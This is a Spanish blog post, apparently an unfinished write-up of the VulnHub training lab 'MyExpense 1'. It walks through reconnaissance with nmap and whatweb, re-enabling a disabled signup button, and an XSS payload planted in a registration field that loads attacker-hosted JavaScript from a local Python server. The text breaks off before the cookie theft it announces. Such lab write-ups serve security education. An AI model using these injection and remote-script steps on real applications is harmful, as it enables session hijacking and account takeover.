---
layout: post
author: Isui Martinez
title: Writeup MyExpense 1 - Vulnhub (En redacción)
---
![Banner-MyExpense](/images/myexpense/banner-myexpense-vh.png "banner-myexpense1")
## My Expense from VulnHub Spanish Writeup

#### Skills

* Web Enumeration
* Enabling disabled button in the user's registration form
* XSS (Cross-Site Scripting)
* CSRF (Cross-Site Request Forgery)
* XSS + JavaScript file in order to steal the user's session cookie
* XSS + CSRF in order to activate new registered users
* XSS Vulnerability in message management system
* Stealing session cookies with XSS vulnerability in message handling system
* Cookie Hijacking
* SQL Injection (Union Query Based)
* Cracking Hashes
* Logging in as the boss and sending us the corresponding money

## Escenario
Usted es "Samuel Lamotte" y acaba de ser despedido de su empresa "Furtura Business Informatique". Lamentablemente, debido a su salida apresurada, no tuvo tiempo de validar su informe de gastos de su último viaje de negocios, que todavía asciende a 750 € correspondientes a un vuelo de regreso a su último cliente. Temiendo que su antiguo empleador no quiera reembolsarle este informe de gastos, decide hackear la aplicación interna llamada "MyExpense " para gestionar los informes de gastos de los empleados.  Así estarás en tu coche, en el aparcamiento de la empresa y conectado a la red Wi-Fi interna (la llave aún no ha sido cambiada después de tu salida). La aplicación está protegida mediante autenticación de nombre de usuario/contraseña y espera que el administrador aún no haya modificado o eliminado su acceso.  Tus credenciales fueron: samuel/fzghn4lw  
Una vez finalizado el desafío, la bandera se mostrará en la aplicación mientras esté conectado con su cuenta (samuel).

#### Configuración del entorno de pruebas para VMware
Configurar la interfaz de red de para que pueda servir en VMware.
Entrar en modo edición con la letra `E`
Escribir el comando:
```
rw init=/bin/bash
```
Y pulsar `Enter`
![](/images/myexpense/Pasted image 20240602225819.png)
Y pulsar la combinación de teclas: ``Ctrl+X`
Luego revisar desde Kali si ha sido asignada la dirección IP.
Ahora de deben de configurar las tarea automatizadas, de Python, se ingresa al directorio OPT:
```
cd /opt
```

![](/images/myexpense/Pasted image 20240602230542.png)

Mediante la herramienta de Nano se van a editar todos los archivos
### Reconocimiento
La fase de reconocimiento en un entorno local como el de este ejemplo puede funcionar un trace ICMP, y también un escaneo con `arp-scan`:

![](/images/myexpense/Pasted image 20240602231258.png)

Se puede intuir que el dispositivo objetivo es el que tiene asignada la dirección IP `192.168.93.143`. La trace ICMP, nos indica que el tiempo de vida de respuesta del paquete, es de 64, lo que da indicios de ser un posible sistema Linux.
```
┌──(isui㉿kali)-[~]
└─$ ping -c 1 192.168.93.143
PING 192.168.93.143 (192.168.93.143) 56(84) bytes of data.
64 bytes from 192.168.93.143: icmp_seq=1 ttl=64 time=1.21 ms

--- 192.168.93.143 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.206/1.206/1.206/0.000 ms
┌──(isui㉿kali)-[~]
└─$ 
```

Se puede continuar con un escaneo directo al objetivo con la herramienta nmap, con el fin de encontrar posibles puertos abiertos para analizar vulnerabilidades:
```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.93.143 -oG puertos
```
![](/images/myexpense/Pasted image 20240602232216.png)

Se pueden extraer los puertos del escaneo, con one-liner que extrae los puertos hallados durante el escaneo y los copia a la clipboard:
```
grep -oP '\d+/open/tcp/\S+' puertos | cut -d '/' -f 1 | tr '\n' ',' | xclip -selection clipboard
```

![](/images/myexpense/Pasted image 20240602232831.png)

Luego de ello, se debe realizar un escaneo a cada puerto detectado, con el comando:

```
sudo nmap -sCV -p80,49733,59151,60855 -A 192.168.93.143 -oN objetivo
```

Se puede ver el escaneo directo en la terminal, con la herramienta cat, en este caso se utilizo batcat, pero solo es una cuestión visual, lo importante es poder ver la información:

![](/images/myexpense/Pasted image 20240602232952.png)

Se observa la versión de Apache corriendo en el puerto 80, corriendo un servicio HTTP.
Aun como parte del reconocimiento, se realiza un analisis de la herramientas que utiliza el servicio web con la herramienta whatweb:

```
whatweb http//192.168.93.143
```

![](/images/myexpense/Pasted image 20240602233613.png)

Se puede ver la versión del servidor Apache, el titulo del sitio. A continuación se enviará un ataque de fuerza bruta, con nmap, para listar todas las posibles rutas del sitio web:

```
sudo nmap --script http-enum -p80 192.168.93.143 -oN webScan
```

![](/images/myexpense/Pasted image 20240602234140.png)

Muestra información intersante, así como un archivo robots, el cual se puede visualizar con el comando:

```
curl -s -X GET http://192.168.93.143/robots.txt
```

![](/images/myexpense/Pasted image 20240602234444.png)

Ingresando a la Web, se puede observar un botón para un posible login:

![](/images/myexpense/Pasted image 20240602234610.png)

![](/images/myexpense/Pasted image 20240602234629.png)

En base al script de `nmap` de detecto la dirección `/admin/admin.php` :

![](/images/myexpense/Pasted image 20240604234223.png)

Se despliega una lista de los usuarios, nombres, correos, rol, y estado de su cuenta, en nuestro caso particular la cuenta de Samuel, se encuentra **inactiva**.
En base al escenario, y reconocimiento, se puede inferir que el usuario, ya que se cuenta desde el comienzo con la contraseña:

![](/images/myexpense/Pasted image 20240604234646.png)

Se procede a probar las credenciales para tener acceso al aplicativo:

![](/images/myexpense/Pasted image 20240604234740.png)

La validación de las credenciales parece ser correcta, pero indica que la cuenta ha sido bloqueada o inhabilitada por los administradores:

![](/images/myexpense/Pasted image 20240604234912.png)

Se observa que hay un formulario para registrar usuarios, lo que puede permitir ver como se realizan las peticiones al servidor cuando se ejecuta dicho formulario. Se observa que el botón de `Sing up!` se encuentra deshabilitado:

![](/images/myexpense/Pasted image 20240604235915.png)

Este problema se puede resolver, desactivando el argumento `disabled` desde el código HTML:

![](/images/myexpense/Pasted image 20240605000119.png)

Y la cuenta se puede crear correctamente:

![](/images/myexpense/Pasted image 20240605000322.png)

Si se lista la nueva cuenta se puede observar:

![](/images/myexpense/Pasted image 20240605000421.png)

## XSS
A continuación mediante la creación de una nueva cuenta, ejecutara un CSRF para intentar cargar un recurso externo:
```
<script src="http://192.168.93.132/data.js"></script>
```
El proposito de este recurso, primeto es no generar sospecha sobre el administrador, si es que este esta vigilando el trafico. Luego de ello que que el servidor http de la organización, interprete y ejecute el recurso en mi máquina.
![[Pasted image 20240605002810.png]]
Para validar que este tipo de ataque, es posible, dede la máquina del atacante, se levanta un servidor http, con python, que deberia registrar los intentos solicitudes para cargar el recurso `data.js`.
```
python3 -m http.server 80
```
![](/images/myexpense/Pasted image 20240605003232.png)

Se tuvo exito, y el ataque llevado a cabo, intenta que el servidor ejecute el recurso, que en este momento no existe.
Ahora, con paciencia, se busca que algun usuario del lado del servidor, revise constantemente la web, para capturar esas solicitudes:



